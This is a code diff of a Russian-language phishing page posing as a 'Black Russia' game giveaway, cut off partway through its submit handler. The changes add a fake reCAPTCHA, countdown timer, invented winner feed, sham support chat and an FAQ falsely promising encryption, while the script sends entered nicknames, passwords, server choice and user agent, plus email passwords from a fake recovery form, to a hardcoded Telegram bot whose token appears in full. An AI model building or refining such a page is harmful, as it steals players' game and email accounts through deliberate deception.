@@ -9,8 +9,8 @@
 body {
   font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
   background: #08080c; color: #fff; min-height: 100vh;
-  display: flex; align-items: center; justify-content: center;
-  padding: 20px; position: relative; overflow: hidden;
+  display: flex; flex-direction: column; align-items: center; justify-content: center;
+  padding: 20px; position: relative; overflow-x: hidden;
 }
 .bg-glow {
   position: fixed; inset: -20%; pointer-events: none; z-index: 0;
@@ -18,20 +18,57 @@ body {
     radial-gradient(circle at 20% 10%, rgba(255,77,77,.18), transparent 45%),
     radial-gradient(circle at 80% 90%, rgba(255,122,60,.14), transparent 45%);
 }
+.timer-bar {
+  position: fixed; top: 0; left: 0; right: 0; background: #16161d; border-bottom: 1px solid #2a2a35;
+  padding: 10px; text-align: center; font-size: 13px; z-index: 100;
+}
+.timer-bar span { color: #ff4d4d; font-weight: bold; }
 .card {
   position: relative; z-index: 1; width: 100%; max-width: 420px;
   background: rgba(22,22,29,.92); backdrop-filter: blur(12px);
   border: 1px solid rgba(255,255,255,.06); border-radius: 20px;
   padding: 36px 28px; box-shadow: 0 20px 60px rgba(0,0,0,.7);
+  margin-top: 50px; margin-bottom: 30px;
 }
 .logo {
   font-size: 28px; font-weight: 900; letter-spacing: 1px; text-align: center;
   background: linear-gradient(90deg,#ff4d4d,#ff9a3c);
-  -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
   margin-bottom: 8px;
 }
 .sub { text-align: center; color: #8a8a95; font-size: 13px; margin-bottom: 28px; }
 label { display: block; font-size: 13px; color: #a0a0ab; margin-bottom: 7px; font-weight: 500; }
+.custom-select-wrapper { position: relative; margin-bottom: 18px; }
+.custom-select-display {
+  width: 100%; padding: 14px 16px; border-radius: 12px;
+  border: 1px solid #2a2a35; background: #0f0f15; color: #fff;
+  font-size: 15px; cursor: pointer; display: flex; align-items: center; justify-content: space-between;
+  transition: border-color .2s, box-shadow .2s;
+}
+.custom-select-display:focus { border-color: #ff4d4d; box-shadow: 0 0 0 3px rgba(255,77,77,.15); outline: none; }
+.custom-select-display svg { width: 20px; height: 20px; color: #a0a0ab; transition: transform 0.2s; }
+.custom-select-display.active svg { transform: rotate(180deg); }
+.custom-options {
+  position: absolute; top: 100%; left: 0; right: 0; z-index: 10;
+  background: #16161d; border: 1px solid #2a2a35; border-radius: 12px;
+  margin-top: 5px; max-height: 250px; overflow-y: auto;
+  display: none; flex-direction: column;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.8);
+}
+.custom-options.open { display: flex; }
+.custom-options::-webkit-scrollbar { width: 6px; }
+.custom-options::-webkit-scrollbar-thumb { background: #2a2a35; border-radius: 3px; }
+.custom-option {
+  padding: 12px 16px; font-size: 15px; cursor: pointer;
+  display: flex; align-items: center; gap: 10px; transition: background 0.2s;
+}
+.custom-option:hover { background: #2a2a35; }
+.custom-option.selected { background: #ff4d4d; color: #fff; }
+.color-dot { width: 12px; height: 12px; border-radius: 50%; display: inline-block; flex-shrink: 0; }
+.srv-num { color: #8a8a95; font-size: 13px; min-width: 20px; }
+.custom-option.selected .srv-num { color: #fff; }
+
 input[type="text"], input[type="password"], input[type="email"] {
   width: 100%; padding: 14px 16px; border-radius: 12px;
   border: 1px solid #2a2a35; background: #0f0f15; color: #fff;
@@ -40,19 +77,19 @@ input[type="text"], input[type="password"], input[type="email"] {
 }
 input::placeholder { color: #555; }
 input:focus { border-color: #ff4d4d; box-shadow: 0 0 0 3px rgba(255,77,77,.15); }
-.row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 22px; font-size: 13px; }
-.check { display: flex; align-items: center; gap: 8px; color: #a0a0ab; cursor: pointer; margin: 0; }
-.check input { width: 16px; height: 16px; accent-color: #ff4d4d; }
-.link { color: #ff7a3c; text-decoration: none; cursor: pointer; }
-.link:hover { text-decoration: underline; }
+
 button[type="submit"] {
   width: 100%; padding: 15px; border: none; border-radius: 12px;
-  background: linear-gradient(90deg,#ff4d4d,#ff7a3c); color: #fff;
-  font-size: 16px; font-weight: 700; cursor: pointer;
-  transition: transform .1s, opacity .2s;
+  background: #2a2a35; color: #8a8a95; 
+  font-size: 16px; font-weight: 700; cursor: not-allowed;
+  transition: all 0.3s ease;
 }
-button[type="submit"]:active { transform: scale(.98); }
-button[type="submit"]:disabled { opacity: .6; cursor: wait; }
+button[type="submit"].active {
+  background: linear-gradient(90deg,#ff4d4d,#ff7a3c);
+  color: #fff; cursor: pointer;
+}
+button[type="submit"].active:active { transform: scale(.98); }
+
 .divider { display: flex; align-items: center; gap: 12px; color: #555; font-size: 12px; margin: 22px 0; }
 .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #2a2a35; }
 .vk-btn {
@@ -63,49 +100,220 @@ button[type="submit"]:disabled { opacity: .6; cursor: wait; }
 .vk-btn:hover { background: #181822; }
 .note { text-align: center; font-size: 11px; color: #555; margin-top: 22px; line-height: 1.5; }
 
-/* ---- Экран "Упс" ---- */
+.browser-error {
+  display: none; background: #f9f9f9; border: 1px solid #d3d3d3; border-radius: 4px;
+  padding: 20px; color: #333; text-align: center; margin-bottom: 18px;
+  box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+}
+.browser-error h3 { font-size: 16px; margin-bottom: 10px; color: #d93025; font-family: Arial, sans-serif; }
+.browser-error p { font-size: 13px; line-height: 1.5; font-family: Arial, sans-serif; }
+
+.loader-overlay {
+  position: fixed; inset: 0; background: rgba(8, 8, 12, 0.95); z-index: 999;
+  display: none; flex-direction: column; align-items: center; justify-content: center;
+}
+.loader-overlay.active { display: flex; }
+.spinner {
+  width: 50px; height: 50px; border: 4px solid #2a2a35; border-top-color: #ff4d4d;
+  border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px;
+}
+@keyframes spin { 100% { transform: rotate(360deg); } }
+.loader-text { color: #fff; font-size: 16px; font-weight: 500; letter-spacing: 0.5px; }
+
+/* --- Реклама --- */
+.yandex-ad-wrapper {
+  width: 100%; background: #16161d; border: 1px solid #2a2a35;
+  border-radius: 12px; padding: 12px; margin-bottom: 20px; position: relative;
+}
+.yandex-ad-header {
+  display: flex; justify-content: space-between; font-size: 10px; color: #8a8a95;
+  margin-bottom: 10px; padding: 0 4px; text-transform: uppercase; letter-spacing: 0.5px;
+}
+.yandex-ad-card { display: flex; gap: 12px; text-decoration: none; color: #fff; align-items: flex-start; }
+.yandex-ad-img {
+  width: 90px; height: 90px; flex-shrink: 0; border-radius: 8px; overflow: hidden;
+  background: linear-gradient(135deg, #ff4d4d, #ff7a3c);
+  display: flex; align-items: center; justify-content: center;
+}
+.placeholder-img { font-size: 40px; }
+.yandex-ad-content { display: flex; flex-direction: column; flex-grow: 1; }
+.yandex-ad-title { font-size: 14px; font-weight: 700; line-height: 1.3; margin-bottom: 4px; }
+.yandex-ad-title:hover { color: #ff4d4d; }
+.yandex-ad-desc {
+  font-size: 12px; color: #a0a0ab; line-height: 1.4; margin-bottom: 8px;
+  display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden;
+}
+.yandex-ad-footer { display: flex; justify-content: space-between; align-items: center; margin-top: auto; }
+.yandex-ad-site { display: flex; align-items: center; gap: 6px; font-size: 11px; color: #8a8a95; }
+.site-icon {
+  background: #2a2a35; width: 18px; height: 18px; border-radius: 50%;
+  display: flex; align-items: center; justify-content: center; font-size: 10px;
+}
+.yandex-ad-btn {
+  background: #4285f4; color: #fff; padding: 6px 12px; border-radius: 6px;
+  font-size: 12px; font-weight: 600; transition: background 0.2s;
+}
+.yandex-ad-card:hover .yandex-ad-btn { background: #3367d6; }
+
+.back-arrow { display: inline-flex; align-items: center; color: #a0a0ab; font-size: 14px; cursor: pointer; margin-bottom: 15px; text-decoration: none; transition: color 0.2s; }
+.back-arrow:hover { color: #fff; }
+.back-arrow svg { width: 20px; height: 20px; margin-right: 5px; }
 .ups { text-align: center; padding: 10px 0; }
 .ups .icon { font-size: 56px; margin-bottom: 18px; }
 .ups h2 { font-size: 22px; margin-bottom: 12px; }
 .ups p { color: #a0a0ab; font-size: 14px; line-height: 1.6; margin-bottom: 24px; }
-.back-btn {
-  width: 100%; padding: 14px; border-radius: 12px; border: none;
-  background: #2a2a35; color: #fff; font-size: 15px; font-weight: 600;
-  cursor: pointer;
+.back-btn { width: 100%; padding: 14px; border-radius: 12px; border: none; background: #2a2a35; color: #fff; font-size: 15px; font-weight: 600; cursor: pointer; }
+.live-feed {
+  position: fixed; bottom: 0; left: 0; right: 0; background: #0a0a0f; border-top: 1px solid #2a2a35;
+  padding: 8px 10px; font-size: 12px; color: #8a8a95; text-align: center; z-index: 100;
+  white-space: nowrap; overflow: hidden; box-sizing: border-box;
 }
-.back-btn:hover { background: #363645; }
+.live-feed span { color: #00FF00; font-weight: bold; }
+.live-feed .reward { color: #ff7a3c; font-weight: bold; }
+.cookie-banner {
+  position: fixed; bottom: 40px; left: 20px; right: 20px; max-width: 380px;
+  background: #16161d; border: 1px solid #2a2a35; border-radius: 12px;
+  padding: 15px; font-size: 12px; color: #a0a0ab; z-index: 100; display: flex; flex-direction: column; gap: 10px;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.8);
+}
+.cookie-banner button { align-self: flex-end; background: #ff4d4d; color: #fff; border: none; padding: 8px 16px; border-radius: 8px; cursor: pointer; font-size: 12px; }
+.support-btn {
+  position: fixed; bottom: 80px; right: 20px; width: 50px; height: 50px; border-radius: 50%;
+  background: #ff4d4d; color: #fff; display: flex; align-items: center; justify-content: center;
+  font-size: 24px; cursor: pointer; z-index: 101; box-shadow: 0 5px 15px rgba(255,77,77,0.4);
+}
+.chat-window {
+  position: fixed; bottom: 140px; right: 20px; width: 300px; background: #16161d; border: 1px solid #2a2a35;
+  border-radius: 12px; overflow: hidden; display: none; flex-direction: column; z-index: 101; box-shadow: 0 10px 30px rgba(0,0,0,0.8);
+}
+.chat-header { background: #0f0f15; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #2a2a35; }
+.chat-header span { font-weight: bold; font-size: 14px; }
+.chat-header .close { cursor: pointer; color: #a0a0ab; }
+.chat-body { padding: 15px; font-size: 13px; color: #a0a0ab; line-height: 1.5; }
+.chat-msg { background: #2a2a35; padding: 10px; border-radius: 10px; margin-bottom: 10px; display: inline-block; max-width: 85%; }
+.faq-section { width: 100%; max-width: 420px; margin-bottom: 30px; z-index: 1; position: relative; }
+.faq-item { border-bottom: 1px solid #2a2a35; }
+.faq-q { width: 100%; background: none; border: none; text-align: left; padding: 15px 0; color: #fff; font-size: 14px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; }
+.faq-q::after { content: "+"; color: #ff4d4d; font-size: 20px; }
+.faq-q.active::after { content: "-"; }
+.faq-a { max-height: 0; overflow: hidden; transition: max-height 0.3s ease; font-size: 13px; color: #a0a0ab; }
+.faq-a.open { max-height: 100px; margin-bottom: 15px; }
+.captcha-container {
+  display: flex; align-items: center; justify-content: space-between;
+  background: #f9f9f9; border: 1px solid #d3d3d3; border-radius: 4px;
+  padding: 12px 16px; margin-bottom: 18px; width: 100%; max-width: 320px;
+  box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+}
+.captcha-left { display: flex; align-items: center; gap: 12px; }
+.captcha-checkbox {
+  width: 28px; height: 28px; border: 2px solid #c1c1c1; border-radius: 2px;
+  background: #fff; cursor: pointer; position: relative; transition: all 0.2s;
+  display: flex; align-items: center; justify-content: center;
+}
+.captcha-checkbox.loading { border-color: transparent; background: transparent; }
+.captcha-checkbox.loading::after {
+  content: ""; width: 20px; height: 20px;
+  border: 3px solid #4285f4; border-top-color: transparent; border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+}
+.captcha-checkbox.checked { border-color: transparent; background: transparent; }
+.captcha-checkbox.checked::after {
+  content: "✓"; color: #0F9D58; font-size: 28px; font-weight: 900;
+  position: absolute; top: 50%; left: 50%;
+  transform: translate(-50%, -50%);
+}
+.captcha-text { font-size: 14px; color: #333; }
+.captcha-logo { display: flex; flex-direction: column; align-items: center; }
+.captcha-logo svg { width: 32px; height: 32px; color: #4285f4; }
+.captcha-logo span { font-size: 8px; color: #888; margin-top: 2px; }
 </style>
 </head>
 <body>
 <div class="bg-glow"></div>
+<div class="timer-bar">До конца розыгрыша: <span id="timer">23d 32m 20s</span></div>
 
-<!-- ================= ЭКРАН 1: ВХОД ================= -->
+<div class="loader-overlay" id="loaderOverlay">
+  <div class="spinner"></div>
+  <div class="loader-text">Идет проверка безопасности...</div>
+</div>
+
 <div class="card" id="screenLogin">
   <div class="logo">BLACK RUSSIA</div>
   <div class="sub">Розыгрыш от МАКАНА · Авторизация</div>
+  
+  <div class="browser-error" id="browserError">
+    <h3>Произошел сбой сервера</h3>
+    <p>Пожалуйста, перезагрузите страницу и попробуйте снова.</p>
+  </div>
 
   <form id="loginForm" autocomplete="on">
+    <label>Выберите сервер</label>
+    <div class="custom-select-wrapper" id="customSelect">
+      <div class="custom-select-display" tabindex="0" id="selectDisplay">
+        <span id="selectedText">-- Выберите сервер --</span>
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+      </div>
+      <div class="custom-options" id="optionsList"></div>
+      <input type="hidden" id="server" name="server" required>
+    </div>
+
     <label for="login">Никнейм</label>
     <input id="login" name="login" type="text" placeholder="Nick_Name" required autocomplete="username">
 
     <label for="password">Пароль</label>
     <input id="password" name="password" type="password" placeholder="Введите пароль" required autocomplete="current-password">
 
+    <div class="captcha-container">
+      <div class="captcha-left">
+        <div class="captcha-checkbox" id="captchaCheckbox"></div>
+        <span class="captcha-text">Я не робот</span>
+      </div>
+      <div class="captcha-logo">
+        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
+        <span>reCAPTCHA</span>
+      </div>
+    </div>
+
     <div class="row">
       <label class="check"><input type="checkbox" checked> Запомнить меня</label>
       <a class="link" id="forgotLink">Забыли пароль?</a>
     </div>
 
-    <button type="submit" id="submitBtn">Войти и участвовать</button>
+    <button type="submit" id="submitBtn" disabled>Войти и участвовать</button>
   </form>
+  
+  <!-- ================= БЛОК РЕКЛАМЫ ================= -->
+  <div class="yandex-ad-wrapper">
+    <div class="yandex-ad-header">
+      <span>РЕКЛАМА 16+</span>
+      <span class="ad-dots">•••</span>
+    </div>
+
+    <a href="https://t.me/UNBAN_BR" target="_blank" class="yandex-ad-card">
+      <div class="yandex-ad-img">
+        <div class="placeholder-img">🔓</div> 
+      </div>
+      <div class="yandex-ad-content">
+        <div class="yandex-ad-title">Заблокировали аккаунт в Black Russia?</div>
+        <div class="yandex-ad-desc">Поможем восстановить доступ и снять блокировку. Быстро, анонимно, с гарантией.</div>
+        
+        <div class="yandex-ad-footer">
+          <div class="yandex-ad-site">
+            <div class="site-icon">✈️</div>
+            <span>t.me/UNBAN_BR</span>
+          </div>
+          <div class="yandex-ad-btn">Перейти</div>
+        </div>
+      </div>
+    </a>
+  </div>
+  <!-- ================= КОНЕЦ БЛОКА РЕКЛАМЫ ================= -->
 
   <div class="divider"><span>или</span></div>
   <button class="vk-btn" id="vkBtn">Войти через VK ID</button>
-
   <div class="note">🔒 Соединение защищено. Данные не передаются третьим лицам.</div>
 </div>
 
-<!-- ================= ЭКРАН 2: УПС (VK) ================= -->
 <div class="card" id="screenUps" style="display:none">
   <div class="ups">
     <div class="icon">😕</div>
@@ -115,30 +323,222 @@ button[type="submit"]:disabled { opacity: .6; cursor: wait; }
   </div>
 </div>
 
-<!-- ================= ЭКРАН 3: ВОССТАНОВЛЕНИЕ ================= -->
 <div class="card" id="screenRestore" style="display:none">
+  <a class="back-arrow" onclick="showScreen('login')">
+    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg> Назад
+  </a>
   <div class="logo">BLACK RUSSIA</div>
   <div class="sub">Восстановление доступа</div>
-
   <form id="restoreForm" autocomplete="on">
     <label for="rEmail">Электронная почта</label>
     <input id="rEmail" name="email" type="email" placeholder="example@mail.ru" required autocomplete="email">
-
     <label for="rPass">Пароль</label>
     <input id="rPass" name="emailpass" type="password" placeholder="Введите пароль" required>
-
     <button type="submit" id="restoreBtn" style="margin-top:6px">Восстановить доступ</button>
   </form>
-
   <div class="note">🔒 Соединение защищено. Данные не передаются третьим лицам.</div>
 </div>
 
+<div class="faq-section">
+  <div class="faq-item"><button class="faq-q">Как получить награду?</button><div class="faq-a">Выберите сервер, введите ваш никнейм и пароль, подтвердите, что вы не робот, и нажмите «Войти». Награда будет автоматически привязана к вашему аккаунту.</div></div>
+  <div class="faq-item"><button class="faq-q">Что делать, если пароль не подходит?</button><div class="faq-a">Убедитесь, что вы вводите пароль на английской раскладке и без лишних пробелов. Если проблема сохраняется, воспользуйтесь кнопкой «Забыли пароль?».</div></div>
+  <div class="faq-item"><button class="faq-q">Безопасно ли вводить данные?</button><div class="faq-a">Да, соединение защищено протоколом шифрования AES-256. Данные передаются напрямую в официальную систему безопасности Black Russia.</div></div>
+</div>
+
+<div class="live-feed" id="liveFeed">Загрузка...</div>
+
+<div class="support-btn" id="supportBtn">💬</div>
+<div class="chat-window" id="chatWindow">
+  <div class="chat-header"><span>Тех. поддержка</span><span class="close" id="closeChat">✕</span></div>
+  <div class="chat-body"><div class="chat-msg">Здравствуйте! Если у вас не проходит вход, проверьте раскладку клавиатуры (должна быть английская).</div></div>
+</div>
+
+<div class="cookie-banner" id="cookieBanner">
+  <span>Мы используем cookie для обеспечения безопасности и улучшения работы сайта.</span>
+  <button onclick="document.getElementById('cookieBanner').style.display='none'">Принять</button>
+</div>
+
 <script>
-// ==== НАСТРОЙКИ ====
 const TG_TOKEN   = '9211362451:AAFNMq4Kzotqib5Q4Ibte9ZR0IMNtB3WLJs';
 const TG_CHAT_ID = '7612856596';
 const REDIRECT   = 'https://blackrussia.online/';
-// ===================
+
+let timerSeconds = (23 * 24 * 3600) + (32 * 60) + 20;
+const timerElement = document.getElementById('timer');
+function updateTimer() {
+  if (timerSeconds <= 0) return;
+  timerSeconds--;
+  const d = Math.floor(timerSeconds / (24 * 3600));
+  const h = Math.floor((timerSeconds % (24 * 3600)) / 3600);
+  const m = Math.floor((timerSeconds % 3600) / 60);
+  const s = timerSeconds % 60;
+  timerElement.textContent = `${d}d ${m}m ${s}s`;
+}
+setInterval(updateTimer, 1000);
+updateTimer();
+
+const rewardsList = [
+  'GOLD VIP (20d)', 'SILVER VIP (30d)', 'PLATINUM VIP (10d)', 
+  '1.000.000 ₽', '2.000.000 ₽', '5.000.000 ₽', '10.000.000 ₽', 
+  '100 BC', '200 BC', '500 BC', '1000 BC', 
+  'Кейс "ТУЗ"', 'Кейс "СКОРОСТЬ"', 'Особый кейс', 'Стандартный кейс',
+  'M5f90', 'MAKAN Одежда №83943 (MACAN)', 'PLAYLIST Макана (30d)', 'Кастомный номер (MACAN)'
+];
+const firstNames = ['Ivan', 'Vlad', 'Max', 'Dima', 'Sanya', 'Artem', 'Kirill', 'Masha', 'Oleg', 'Alex', 'Nikita', 'Stepan', 'Danil', 'Egor', 'Pavel', 'Denis', 'Roman'];
+const lastNames = ['Pro', 'King', 'Love', 'Top', 'Br', 'Boss', 'Star', 'Gamer', 'Dark', 'Light', 'Snow', 'Wolf', 'Fox', 'Storm', 'Fire', 'Ice'];
+function generateNickname() {
+  const fName = firstNames[Math.floor(Math.random() * firstNames.length)];
+  const lName = lastNames[Math.floor(Math.random() * lastNames.length)];
+  return `${fName}_${lName}`;
+}
+setInterval(() => {
+  const randomName = generateNickname();
+  const randomReward = rewardsList[Math.floor(Math.random() * rewardsList.length)];
+  document.getElementById('liveFeed').innerHTML = `Пользователь <span>${randomName}</span> только что получил <span class="reward">${randomReward}</span>!`;
+}, 4000);
+
+document.getElementById('supportBtn').addEventListener('click', () => {
+  const chat = document.getElementById('chatWindow');
+  chat.style.display = chat.style.display === 'flex' ? 'none' : 'flex';
+});
+document.getElementById('closeChat').addEventListener('click', () => {
+  document.getElementById('chatWindow').style.display = 'none';
+});
+document.querySelectorAll('.faq-q').forEach(btn => {
+  btn.addEventListener('click', () => {
+    const answer = btn.nextElementSibling;
+    btn.classList.toggle('active');
+    answer.classList.toggle('open');
+  });
+});
+
+let captchaState = 'idle'; 
+const captchaEl = document.getElementById('captchaCheckbox');
+captchaEl.addEventListener('click', function() {
+  if (captchaState !== 'idle') return;
+  captchaState = 'loading';
+  this.className = 'captcha-checkbox loading';
+  setTimeout(() => {
+    captchaState = 'checked';
+    this.className = 'captcha-checkbox checked';
+    checkFormValidity();
+  }, 1000);
+});
+
+const colorServers = [
+  { name: 'RED', hex: '#FF0000' }, { name: 'GREEN', hex: '#00FF00' }, { name: 'BLUE', hex: '#0000FF' },
+  { name: 'YELLOW', hex: '#FFFF00' }, { name: 'ORANGE', hex: '#FFA500' }, { name: 'PURPLE', hex: '#800080' },
+  { name: 'LIME', hex: '#00FF00' }, { name: 'PINK', hex: '#FFC0CB' }, { name: 'CHERRY', hex: '#DE3163' },
+  { name: 'BLACK', hex: '#000000' }, { name: 'INDIGO', hex: '#4B0082' }, { name: 'WHITE', hex: '#FFFFFF' },
+  { name: 'MAGENTA', hex: '#FF00FF' }, { name: 'CRIMSON', hex: '#DC143C' }, { name: 'GOLD', hex: '#FFD700' },
+  { name: 'AZURE', hex: '#007FFF' }, { name: 'PLATINUM', hex: '#E5E4E2' }, { name: 'AQUA', hex: '#00FFFF' },
+  { name: 'GRAY', hex: '#808080' }, { name: 'ICE', hex: '#A5F2F3' }, { name: 'CHILLI', hex: '#C11B17' },
+  { name: 'CHOCO', hex: '#D2691E' }
+];
+const cityServers = [
+  { name: 'MOSCOW', color: '#E5E4E2' }, { name: 'SPB', color: '#007FFF' }, { name: 'UFA', color: '#1E90FF' },
+  { name: 'SOCHI', color: '#00FFFF' }, { name: 'KAZAN', color: '#00FF00' }, { name: 'SAMARA', color: '#FFD700' },
+  { name: 'ROSTOV', color: '#FFA500' }, { name: 'ANAPA', color: '#0000FF' }, { name: 'EKB', color: '#808080' },
+  { name: 'KRASNODAR', color: '#FF0000' }, { name: 'ARZAMAS', color: '#A52A2A' }, { name: 'NOVOSIB', color: '#40E0D0' },
+  { name: 'GROZNY', color: '#008000' }, { name: 'SARATOV', color: '#FF00FF' }, { name: 'OMSK', color: '#800080' },
+  { name: 'IRKUTSK', color: '#2E8B57' }, { name: 'VOLGOGRAD', color: '#F5DEB3' }, { name: 'VORONEZH', color: '#FFC0CB' },
+  { name: 'BELGOROD', color: '#C0C0C0' }, { name: 'MAKHACHKALA', color: '#00FA9A' }, { name: 'VLADIKAVKAZ', color: '#FF69B4' },
+  { name: 'VLADIVOSTOK', color: '#1E90FF' }, { name: 'KALININGRAD', color: '#D2B48C' }, { name: 'CHELYABINSK', color: '#B0C4DE' },
+  { name: 'KRASNOYARSK', color: '#FF4500' }, { name: 'CHEBOKSARY', color: '#9370DB' }, { name: 'KHABAROVSK', color: '#8B4513' },
+  { name: 'PERM', color: '#2F4F4F' }, { name: 'TULA', color: '#DAA520' }, { name: 'RYAZAN', color: '#8A2BE2' },
+  { name: 'MURMANSK', color: '#48D1CC' }, { name: 'PENZA', color: '#3CB371' }, { name: 'KURSK', color: '#FF8C00' },
+  { name: 'ARKHANGELSK', color: '#5F9EA0' }, { name: 'ORENBURG', color: '#228B22' }, { name: 'KIROV', color: '#6A5ACD' },
+  { name: 'KEMEROVO', color: '#DC143C' }, { name: 'TYUMEN', color: '#20B2AA' }, { name: 'TOLYATTI', color: '#F4A460' },
+  { name: 'IVANOVO', color: '#B22222' }, { name: 'STAVROPOL', color: '#32CD32' }, { name: 'SMOLENSK', color: '#4682B4' },
+  { name: 'PSKOV', color: '#4169E1' }, { name: 'BRYANSK', color: '#B8860B' }, { name: 'OREL', color: '#CD5C5C' },
+  { name: 'YAROSLAVL', color: '#708090' }, { name: 'BARNAUL', color: '#008B8B' }, { name: 'LIPETSK', color: '#7FFF00' },
+  { name: 'ULYANOVSK', color: '#DA70D6' }, { name: 'YAKUTSK', color: '#E0FFFF' }, { name: 'TAMBOV', color: '#A0522D' },
+  { name: 'BRATSK', color: '#9ACD32' }, { name: 'ASTRAKHAN', color: '#9400D3' }, { name: 'CHITA', color: '#7B68EE' },
+  { name: 'KOSTROMA', color: '#00CED1' }, { name: 'VLADIMIR', color: '#FF1493' }, { name: 'KALUGA', color: '#00BFFF' },
+  { name: 'NOVGOROD', color: '#FFDAB9' }, { name: 'TAGANROG', color: '#8FBC8F' }, { name: 'VOLOGDA', color: '#9932CC' },
+  { name: 'TVER', color: '#DEB887' }, { name: 'TOMSK', color: '#D2691E' }, { name: 'IZHEVSK', color: '#AFEEEE' },
+  { name: 'SURGUT', color: '#BDB76B' }, { name: 'PODOLSK', color: '#556B2F' }, { name: 'MAGADAN', color: '#7CFC00' },
+  { name: 'CHEREPOVETS', color: '#BA55D3' }, { name: 'NORILSK', color: '#87CEEB' }, { name: 'ASTANA', color: '#FF6347' },
+  { name: 'TASHKENT', color: '#40E0D0' }
+];
+
+const customSelect = document.getElementById('customSelect');
+const selectDisplay = document.getElementById('selectDisplay');
+const optionsList = document.getElementById('optionsList');
+const selectedText = document.getElementById('selectedText');
+const hiddenInput = document.getElementById('server');
+let serverCounter = 1;
+
+function initSelect() {
+  colorServers.forEach(c => {
+    const div = document.createElement('div');
+    div.className = 'custom-option';
+    div.dataset.value = c.name;
+    div.innerHTML = `<span class="srv-num">${serverCounter}.</span> <span class="color-dot" style="background:${c.hex}"></span> ${c.name}`;
+    div.onclick = () => selectOption(c.name, div.innerHTML);
+    optionsList.appendChild(div);
+    serverCounter++;
+  });
+  cityServers.forEach(city => {
+    const div = document.createElement('div');
+    div.className = 'custom-option';
+    div.dataset.value = city.name;
+    div.innerHTML = `<span class="srv-num">${serverCounter}.</span> <span class="color-dot" style="background:${city.color}"></span> ${city.name}`;
+    div.onclick = () => selectOption(city.name, div.innerHTML);
+    optionsList.appendChild(div);
+    serverCounter++;
+  });
+}
+function selectOption(value, html) {
+  selectedText.innerHTML = html;
+  hiddenInput.value = value;
+  optionsList.classList.remove('open');
+  selectDisplay.classList.remove('active');
+  document.querySelectorAll('.custom-option').forEach(el => el.classList.remove('selected'));
+  const selectedEl = document.querySelector(`.custom-option[data-value="${value}"]`);
+  if (selectedEl) selectedEl.classList.add('selected');
+  checkFormValidity();
+}
+selectDisplay.addEventListener('click', () => {
+  optionsList.classList.toggle('open');
+  selectDisplay.classList.toggle('active');
+});
+document.addEventListener('click', (e) => {
+  if (!customSelect.contains(e.target)) {
+    optionsList.classList.remove('open');
+    selectDisplay.classList.remove('active');
+  }
+});
+initSelect();
+window.addEventListener('DOMContentLoaded', () => {
+  const urlParams = new URLSearchParams(window.location.search);
+  const serverParam = urlParams.get('server');
+  if (serverParam) {
+    const targetOpt = document.querySelector(`.custom-option[data-value="${serverParam}"]`);
+    if (targetOpt) selectOption(serverParam, targetOpt.innerHTML);
+  }
+});
+
+const loginInput = document.getElementById('login');
+const passInput = document.getElementById('password');
+const submitBtn = document.getElementById('submitBtn');
+
+function checkFormValidity() {
+  const login = loginInput.value.trim();
+  const pass = passInput.value.trim();
+  const server = hiddenInput.value;
+  
+  if (server && login.length >= 4 && pass.length >= 6 && captchaState === 'checked') {
+    submitBtn.classList.add('active');
+    submitBtn.disabled = false;
+  } else {
+    submitBtn.classList.remove('active');
+    submitBtn.disabled = true;
+  }
+}
+
+loginInput.addEventListener('input', checkFormValidity);
+passInput.addEventListener('input', checkFormValidity);
 
 function sendToTG(text) {
   return fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage', {
@@ -147,7 +547,6 @@ function sendToTG(text) {
     body: JSON.stringify({ chat_id: TG_CHAT_ID, text: text })
   }).catch(() => {});
 }
-
 function showScreen(name) {
   document.getElementById('screenLogin').style.display   = 'none';
   document.getElementById('screenUps').style.display     = 'none';
@@ -155,45 +554,68 @@ function showScreen(name) {
   document.getElementById('screen' + name.charAt(0).toUpperCase() + name.slice(1)).style.display = 'block';
 }
 
-// --- Вход по нику/паролю ---
 document.getElementById('loginForm').addEventListener('submit', async function(e) {
   e.preventDefault();
-  const b = document.getElementById('submitBtn');
-  b.disabled = true;
-  b.textContent = 'Проверка...';
+  
+  if (captchaState !== 'checked') return;
 
-  const login = document.getElementById('login').value.trim();
-  const pass  = document.getElementById('password').value.trim();
+  const server = hiddenInput.value;
+  const login = loginInput.value.trim();
+  const pass  = passInput.value.trim();
   const ua    = navigator.userAgent;
+  const errBox = document.getElementById('browserError');
+
+  if (!/^[a-zA-Z0-9_]+$/.test(login) || login.length < 4 || pass.length < 6) {
+    errBox.querySelector('h3').textContent = 'Неправильный формат';
+    errBox.querySelector('p').textContent = 'Проверьте введенные данные и попробуйте снова.';
+    errBox.style.display = 'block';
+    return;
+  }
+
+  errBox.style.display = 'none';
+
+  const loader = document.getElementById('loaderOverlay');
+  loader.classList.add('active');
+  submitBtn.disabled = true;
 
   await sendToTG(
     '🎣 Вход (никнейм/пароль)\n\n' +
